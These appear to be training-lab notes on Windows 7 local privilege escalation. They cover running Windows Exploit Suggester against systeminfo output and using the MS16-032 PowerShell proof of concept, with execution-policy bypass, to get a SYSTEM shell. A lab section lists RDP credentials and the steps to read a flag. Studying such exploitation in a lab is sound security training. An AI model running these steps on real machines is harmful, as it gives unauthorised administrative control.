# Windows Desktop Versions

Windows 7 was made end-of-life on January 14, 2020

| Feature                       | Windows 7 | Windows 10 |
|-------------------------------|-----------|------------|
| Microsoft Password (MFA)      |           | X          |
| BitLocker                     | Partial   | X          |
| Credential Guard              |           | X          |
| Remote Credential Guard       |           | X          |
| Device Guard (code integrity) |           | X          |
| AppLocker                     | Partial   | X          |
| Windows Defender              | Partial   | X          |
| Control Flow Guard            |           | X          |

## Install Python Dependencies (local VM only)

```
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install
sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install
```

## Gathering Systeminfo Command Output

```
systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          5/13/2021, 5:14:12 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows

<SNIP>
```

## Updating the Local Microsoft Vulnerability Database

```
sudo python2.7 windows-exploit-suggester.py --update
```

## Running Windows Exploit Suggester

```
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

...
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
...
```

## Exploiting MS16-032 with PowerShell PoC

https://www.exploit-db.com/exploits/39719

```
Set-ExecutionPolicy bypass -scope process

Import-Module .\Invoke-MS16-032.ps1

Invoke-MS16-032

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

```
C:\htb> whoami

nt authority\system
```

## LAB

xfreerdp /v:10.129.136.237 /u:htb-student /p:HTB_@cademy_stdnt!

cd c:\Tools
Set-ExecutionPolicy bypass -scope process

Import-Module .\Invoke-MS16-032.ps1

Invoke-MS16-032

type c:\Users\Administrator\Desktop\flag.txt

